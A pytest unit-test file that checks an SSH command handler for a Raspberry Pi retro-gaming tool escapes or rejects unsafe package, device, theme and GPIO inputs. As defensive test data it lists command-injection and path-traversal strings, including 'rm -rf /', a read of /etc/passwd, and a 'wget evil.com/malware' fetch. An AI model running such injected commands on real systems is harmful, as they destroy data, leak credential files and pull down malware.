"""Unit tests for secure command execution."""

import shlex
from unittest.mock import MagicMock

import pytest

from retromcp.secure_ssh_handler import SecureSSHHandler


class TestSecureCommandExecution:
    """Test secure command execution with proper escaping."""

    def test_secure_install_packages_valid_packages(self) -> None:
        """Test that SecureSSHHandler properly escapes valid package names."""
        handler = SecureSSHHandler(
            host="example.com", username="pi", password="password"
        )

        # Mock the client and execute_command
        mock_client = MagicMock()
        handler.client = mock_client

        # Mock execute_command to return success
        handler.execute_command = MagicMock(return_value=(0, "", ""))

        # Test valid package names
        valid_packages = ["vim", "nano", "git", "python3", "curl"]

        # Call secure install method
        success, message = handler.install_packages_secure(valid_packages)

        assert success is True
        assert "Successfully installed" in message

        # Check that execute_command was called with proper commands
        calls = handler.execute_command.call_args_list
        assert len(calls) >= 2  # Update and install commands

        # Find the install command
        install_cmd = None
        for call in calls:
            cmd = call[0][0]
            if "apt-get install" in cmd:
                install_cmd = cmd
                break

        assert install_cmd is not None

        # Each package should be quoted (though valid ones don't need it)
        for package in valid_packages:
            assert package in install_cmd

    def test_secure_install_packages_rejects_malicious(self) -> None:
        """Test that SecureSSHHandler rejects malicious package names."""
        handler = SecureSSHHandler(
            host="example.com", username="pi", password="password"
        )

        # Test malicious package names
        malicious_packages = [
            "vim; rm -rf /",
            "nano$(whoami)",
            "git`date`",
            "python3|ls",
            "curl&id",
        ]

        # Each malicious package should be rejected
        for package in malicious_packages:
            with pytest.raises(ValueError, match="Invalid package name"):
                handler.validate_package_name(package)

    def test_secure_gpio_command(self) -> None:
        """Test secure GPIO command execution."""
        handler = SecureSSHHandler(
            host="example.com", username="pi", password="password"
        )

        handler.client = MagicMock()
        handler.execute_command = MagicMock(return_value=(0, "", ""))

        # Test with validated pin number
        pin = 17
        mode = "out"

        success, message = handler.set_gpio_mode_secure(pin, mode)

        assert success is True
        assert f"Set GPIO pin {pin} to mode {mode}" in message

        # Check the command
        cmd = handler.execute_command.call_args[0][0]
        assert f"gpio -g mode {pin} {mode}" in cmd

    def test_secure_controller_test_valid_device(self) -> None:
        """Test secure controller device testing with valid device."""
        handler = SecureSSHHandler(
            host="example.com", username="pi", password="password"
        )

        handler.client = MagicMock()
        handler.execute_command = MagicMock(return_value=(0, "Controller output", ""))

        # Test with valid device path
        valid_device = "/dev/input/js0"

        success, output = handler.test_controller_secure(valid_device)

        assert success is True
        assert output == "Controller output"

        cmd = handler.execute_command.call_args[0][0]
        assert f"timeout 2 jstest --normal {shlex.quote(valid_device)}" in cmd

    def test_secure_controller_test_rejects_malicious(self) -> None:
        """Test that malicious device paths are rejected."""
        handler = SecureSSHHandler(
            host="example.com", username="pi", password="password"
        )

        # Test with malicious device path
        malicious_device = "/dev/input/js0; cat /etc/passwd"

        with pytest.raises(ValueError, match="Invalid device path"):
            handler.validate_device_path(malicious_device)

    def test_secure_theme_setting_valid_theme(self) -> None:
        """Test secure theme configuration with valid theme."""
        handler = SecureSSHHandler(
            host="example.com", username="pi", password="password"
        )

        handler.client = MagicMock()
        handler.execute_command = MagicMock(return_value=(0, "", ""))

        # Test with valid theme name
        valid_theme = "carbon"

        success, message = handler.set_theme_secure(valid_theme)

        assert success is True
        assert f"Set theme to {valid_theme}" in message

        cmd = handler.execute_command.call_args[0][0]
        assert (
            f"xmlstarlet ed -u '//string[@name=\"ThemeSet\"]' -v {shlex.quote(valid_theme)}"
            in cmd
        )

    def test_secure_theme_setting_rejects_malicious(self) -> None:
        """Test that malicious theme names are rejected."""
        handler = SecureSSHHandler(
            host="example.com", username="pi", password="password"
        )

        # Test with malicious theme name
        malicious_theme = "carbon; wget evil.com/malware"

        with pytest.raises(ValueError, match="Invalid theme name"):
            handler.validate_theme_name(malicious_theme)

    def test_input_validation_for_gpio_pins(self) -> None:
        """Test that GPIO pin numbers are validated."""
        handler = SecureSSHHandler(
            host="example.com", username="pi", password="password"
        )

        # Test invalid pins
        invalid_pins = [-1, 41, 100, "17; rm -rf /"]

        for pin in invalid_pins:
            with pytest.raises(ValueError, match="Invalid GPIO pin"):
                handler.validate_gpio_pin(pin)

        # Test valid pins
        valid_pins = [0, 17, 27, 40]
        for pin in valid_pins:
            handler.validate_gpio_pin(pin)  # Should not raise

    def test_input_validation_for_package_names(self) -> None:
        """Test that package names are validated."""
        handler = SecureSSHHandler(
            host="example.com", username="pi", password="password"
        )

        # Test invalid package names
        invalid_packages = [
            "",  # Empty
            " ",  # Whitespace only
            "../../../bin/sh",  # Path traversal
            "package\x00name",  # Null byte
            "package;rm",  # Semicolon
            "package$(whoami)",  # Command substitution
        ]

        for package in invalid_packages:
            with pytest.raises(ValueError, match="Invalid package name"):
                handler.validate_package_name(package)

    def test_input_validation_for_themes(self) -> None:
        """Test that theme names are validated."""
        handler = SecureSSHHandler(
            host="example.com", username="pi", password="password"
        )

        # Test invalid theme names
        invalid_themes = [
            "",  # Empty
            "../themes/evil",  # Path traversal
            "theme; rm -rf /",  # Command injection
            "theme\nname",  # Newline
        ]

        for theme in invalid_themes:
            with pytest.raises(ValueError, match="Invalid theme name"):
                handler.validate_theme_name(theme)

    def test_path_traversal_prevention(self) -> None:
        """Test that path traversal is prevented."""
        handler = SecureSSHHandler(
            host="example.com", username="pi", password="password"
        )

        # Test path traversal attempts
        traversal_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/../etc/../etc/passwd",
            "logs/../../../../etc/shadow",
        ]

        for path in traversal_paths:
            with pytest.raises(ValueError, match="Path traversal"):
                handler.validate_safe_path(path)
